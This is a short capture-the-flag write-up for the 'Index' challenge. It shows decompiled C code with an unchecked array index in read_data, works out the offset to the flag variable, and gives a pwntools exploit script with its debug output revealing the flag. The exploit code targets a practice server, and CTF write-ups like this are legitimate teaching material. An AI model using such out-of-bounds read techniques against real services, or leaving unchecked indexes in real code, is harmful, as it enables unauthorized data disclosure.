# Index

```
I literally hand you the flag, just exploit it already!
```

Decompiled code via Ghidra:

```c
undefined8 main(undefined8 *param_1)
{
  int iVar1;
  long in_FS_OFFSET;
  char local_78 [104];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  init(param_1);
  do {
    while( true ) {
      menu();
      fgets(local_78,100,stdin);
      iVar1 = atoi(local_78);
      if (iVar1 < 5) break;
      if (iVar1 == 0x539) {
        f = fopen("flag.txt","r");
        fgets(flag,0x40,f);
      }
    }
    switch(iVar1) {
    case 0:
      printf("Invalid choice: %s",local_78);
      break;
    case 1:
      store_data();
      break;
    case 2:
      read_data();
      break;
    case 3:
      print_flag();
      break;
    case 4:
      puts("Bye!");
      if (local_10 == *(long *)(in_FS_OFFSET + 0x28)) {
        return 0;
      }
                    /* WARNING: Subroutine does not return */
      __stack_chk_fail();
    }
  } while( true );
}

void read_data(void)
{
  int local_c;
  
  printf("Index: ");
  __isoc99_scanf(&DAT_00102041,&local_c);
  getchar();
  printf("Data: %s",nums + (long)local_c * 8);
  return;
}
```

Steps:

1. read `flag.txt` to flag variable
2. use out of bounds read in `read_data`: `flag` is at 0x1040a0, `nums` is at 0x104060, so index is `(0x1040a0-0x104060)/8=8`
3. get flag


```python
from pwn import *
elf = ELF("./index")
context.binary = elf
context(arch='amd64', os='linux', log_level='debug')

p = remote("play.scriptsorcerers.xyz", 10288)
#p = process("./ld-linux-x86-64.so.2 ./index", shell="True")
p.sendline("1337")
p.sendline("2")
p.recvuntil("Index")
p.sendline("8")
p.recvline()
```

Get flag:

```
[DEBUG] Sent 0x2 bytes:
    b'8\n'
[DEBUG] Received 0x62 bytes:
    b'Data: scriptCTF{4rr4y_00B_unl0ck3d_07ca9df0d3f3}\n'
    b'1. Store data\n'
    b'2. Read data\n'
    b'3. Print flag\n'
    b'4. Exit\n'
[*] Closed connection to play.scriptsorcerers.xyz port 10288
```
